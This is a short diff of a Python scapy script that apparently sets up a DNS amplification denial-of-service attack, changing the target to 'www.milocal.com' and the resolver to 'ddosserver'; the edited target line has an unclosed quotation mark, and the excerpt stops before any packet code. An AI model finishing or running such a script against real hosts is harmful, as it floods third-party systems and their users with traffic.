@@ -1,7 +1,7 @@
 from scapy.all import *
 
-target_ip = "8.8.8.8" # Replace with the target IP address
-open_dns_resolver = "8.8.8.8" # Replace with an open DNS resolver IP
+target_ip = "www.milocal.com # Replace with the target IP address
+open_dns_resolver = "ddosserver" # Replace with an open DNS resolver IP
 dns_query_packets = 1 # Modify as necessary
 
 # Craft DNS query packet
